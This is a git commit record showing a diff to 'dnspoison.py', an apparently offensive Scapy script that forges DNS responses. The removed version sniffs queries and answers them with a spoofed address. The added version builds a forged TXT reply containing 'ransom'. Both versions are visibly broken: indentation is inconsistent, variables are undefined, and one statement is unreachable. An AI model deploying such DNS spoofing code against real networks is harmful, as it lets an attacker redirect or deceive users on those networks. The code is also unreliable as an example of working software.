26b1203cf45a9e80f7e196e74fe8cc06cfd5a5e2
hackingyseguridad <antonio_taboada@hotmail.es>
2019-03-24 23:14:03 +0100

    Update dnspoison.py

--- dnspoison.py
+++ dnspoison.py
@@ -1,23 +1,11 @@
-from threading import Thread
-from Queue import Queue, Empty
+#!/usr/bin/python
+
 from scapy.all import *
 
-m_iface = "wlan1"
-m_finished = False
+def dnsRes(pkt):
 
-def print_summary(packet):
-    target = {'hackingyseguridad':'134.0.10.76'
-    }
-          try:
-            requestIP = packet[IP]
-            requestUDP = packet[UDP]
-            requestDNS = packet[DNS]
-            requestDNSQR = packet[DNSQR]      
-            
-            responseIP = IP(src=requestIP.dst, dst=requestIP.src)
-            responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
-            responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
-            responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
-            answer = responseIP/responseUDP/responseDNS
-            send(answer)
-      print packet.summary()
+    # print pkt[IP].src
+    ip = pkt.getlayer(IP)
+    dns = pkt.getlayer(DNS)
+    return IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, type='TXT', ttl=10,rdata='ransom'))
+    send(dnsRes(a[0]))
